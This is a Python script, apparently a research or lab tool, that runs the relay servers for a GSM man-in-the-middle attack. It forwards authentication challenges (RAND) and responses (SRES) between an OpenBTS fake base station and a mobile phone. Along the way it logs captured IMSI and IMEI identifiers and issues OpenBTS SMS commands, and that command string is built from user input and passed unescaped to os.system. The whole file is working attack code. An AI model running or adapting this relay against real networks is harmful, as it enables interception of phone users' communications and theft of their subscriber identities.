import socket
import threading
import sys
import os

RAND = "aaaabbbbccccdddd"
SRES = "9b36efdf"
TMSIS = []

def handle_rand(rand_data):
    return rand_data.replace(" ", "")

def send_AuthenticationRequest(imsi):
    cmd = "./OpenBTSDo \"sendsms " +imsi+" . " + "10086 \""
    print("excute cmd: "+cmd)
    os.system(cmd)

def print_tmsis():
    if TMSIS == []:
        print("TMSIS_Table is empty!")
        return False
    
    print("IMSI                    IMEI")
    for mobile in TMSIS:
        print(mobile["IMSI"]+"         "+mobile["IMEI"])
    return True

def set_RAND(rand):
    global RAND
    RAND = rand
    print("set RAND -> ",RAND)

def set_SRES(sres):
    global SRES
    SRES = sres
    print("set SRES -> ",SRES)


'''
def start_mobile_rand_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 获取本地主机名
    host = '127.0.0.1'
    port = 12345
    
    # 绑定端口
    server_socket.bind((host, port))
    server_socket.listen(5)
    
    print("mobile rand Server is listening on port 12345...")
    
    while True:
        # 建立客户端连接
        client_socket, addr = server_socket.accept()
        
        
       
        data = client_socket.recv(1024).decode('utf-8')
        print("Received message:",data)
        set_RAND(data)
        # 关闭连接
        client_socket.close()
'''

def start_mobile_server():
    global SRES
    host = '127.0.0.1'
    port = 8888

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()
    print("mobile Server is listening on port 8888...\n")
    
    while True:
        conn, addr = server_socket.accept()
        rand_data = conn.recv(1024).decode('utf-8')
        print("\nReceived rand form mobile:->",rand_data,"<-")
        set_RAND(handle_rand(rand_data))
        
        conn.sendall(SRES.encode('utf-8'))
        print('Send sres:'+ SRES +" to mobile:")
        conn.close()

def start_openbts_server():
    global RAND
    global TMSIS

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 6666)
    
    server_socket.bind(server_address)
    
    server_socket.listen(1)
    print("OpenBTS Server is listening on port 6666...")

    while True:
        connection, client_address = server_socket.accept()
        try:
            connection.sendall(RAND.encode())
            print("\nsending RAND to OpenBTS:: ",RAND)
            
            data = connection.recv(1024)
            if data:
                print("receive message from OpenBTS:")
                if ";" in data.decode():
                    receieve_data = data.decode().split(";")
                    set_SRES(receieve_data[2])
                    TMSIS.append({"IMEI":receieve_data[0],"IMSI":receieve_data[1]})
                    print("receive IMEI from OpenBTS: ",receieve_data[0])
                    print("receive IMSI from OpenBTS:: ",receieve_data[1])
                    print("receive SRES from OpenBTS:: ",receieve_data[2])
                else:
                    sres = data.decode()
                    set_SRES(sres)
                    print("receive SRES from OpenBTS:: ",sres)
        finally:
            connection.close()


def main():
    OpenBTS_server = threading.Thread(target=start_openbts_server)
    Mobile_server = threading.Thread(target=start_mobile_server)

    OpenBTS_server.start()
    Mobile_server.start()
    
    print("This is just a test program to test the mobile side of gsm MITM(man-in-the-middle) attacks\n")
    while True:
        command = input("Server>")
        if command == "exit" or command == "quit":
            sys.exit(0)
        elif command == "tmsis":
            print_tmsis()
        elif command == "show rand":
            print(RAND)
        elif command == "show sres":
            print(SRES)
        elif "set rand" in command:
            if len(command.split()[2]) != 32:
                print("rand is wrong!Please enter 32-bit rand")
            else:
                set_RAND(command.split()[2])
        elif "set sres" in command:
            set_SRES(command.split()[2])
        elif "auth " in command:
            send_AuthenticationRequest(command.split()[1])
        elif command == "":
            continue
        else:
            print("unknown command")

if __name__ == "__main__":
    main()
